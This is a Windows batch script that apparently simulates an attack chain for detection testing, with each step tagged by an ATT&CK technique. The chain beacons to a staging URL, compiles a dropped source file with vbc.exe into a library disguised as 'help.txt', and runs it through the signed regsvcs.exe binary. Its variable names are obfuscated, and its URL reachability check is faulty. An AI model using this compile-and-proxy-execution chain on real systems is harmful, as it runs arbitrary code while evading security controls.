@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET vdafj=%APPDATA%\8773\6d726f20
SET fkpjrw=https://10.0.0.49
SET hmkysq=https://10.0.0.49/stage/2/icon.png?8773-10
SET pyvzby=ITZEL-S2BS
SET ukleoi=10
SET vevqle=help.txt
SET cdqejr=file.txt
SET ooyuza=8773
SET cdxnpl=%APPDATA%\!ukleoi!\macula-simulations.log
SET tjckzt=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319

echo [!DATE! !TIME!][DEBUG][!pyvzby!]: start=>> "!cdxnpl!" 2>nul
curl -k -s -o nul "!hmkysq!"
echo [!DATE! !TIME!][DEBUG][!pyvzby!]: heartbeat=>> "!cdxnpl!" 2>nul
SET mwdxvj=1&SET zrbhfh=
if not exist "!hmkysq!" (SET mwdxvj=0&SET zrbhfh=url_not_reachable)
echo [!DATE! !TIME!][!pyvzby!]: !ukleoi!-!ooyuza!-T1105|Ingress Tool Transfer=!mwdxvj!::!zrbhfh!>> "!cdxnpl!" 2>nul

cd /d "!vdafj!" >nul 2>&1
echo [!DATE! !TIME!][DEBUG][!pyvzby!]: chdir=!ERRORLEVEL!>> "!cdxnpl!" 2>nul
if not exist "!cdqejr!" (
    SET mwdxvj=0&SET zrbhfh=source_not_found
    echo [!DATE! !TIME!][!pyvzby!]: !ukleoi!-!ooyuza!-T1500|Compile After Delivery=!mwdxvj!::!zrbhfh!>> "!cdxnpl!" 2>nul
    exit /b 1
)

echo [!DATE! !TIME!][DEBUG][!pyvzby!]: compile_start=>> "!cdxnpl!" 2>nul
"!tjckzt!\vbc.exe" /target:library /reference:System.EnterpriseServices.dll /out:"!vevqle!" "!cdqejr!" >nul 2>&1
SET mwdxvj=1&SET zrbhfh=
if not exist "!vevqle!" (SET mwdxvj=0&SET zrbhfh=compilation_failed)
echo [!DATE! !TIME!][DEBUG][!pyvzby!]: compile_end=!ERRORLEVEL!>> "!cdxnpl!" 2>nul
echo [!DATE! !TIME!][!pyvzby!]: !ukleoi!-!ooyuza!-T1500|Compile After Delivery=!mwdxvj!::!zrbhfh!>> "!cdxnpl!" 2>nul
if !mwdxvj! equ 0 exit /b 1

echo [!DATE! !TIME!][DEBUG][!pyvzby!]: regsvcs_start=>> "!cdxnpl!" 2>nul
"!tjckzt!\regsvcs.exe" "!vevqle!" >nul 2>&1
SET mwdxvj=1&SET zrbhfh=
if !ERRORLEVEL! neq 0 (SET mwdxvj=0&SET zrbhfh=execution_failed)
echo [!DATE! !TIME!][DEBUG][!pyvzby!]: regsvcs_end=!ERRORLEVEL!>> "!cdxnpl!" 2>nul
echo [!DATE! !TIME!][!pyvzby!]: !ukleoi!-!ooyuza!-T1218|Signed Binary Proxy Execution=!mwdxvj!::!zrbhfh!>> "!cdxnpl!" 2>nul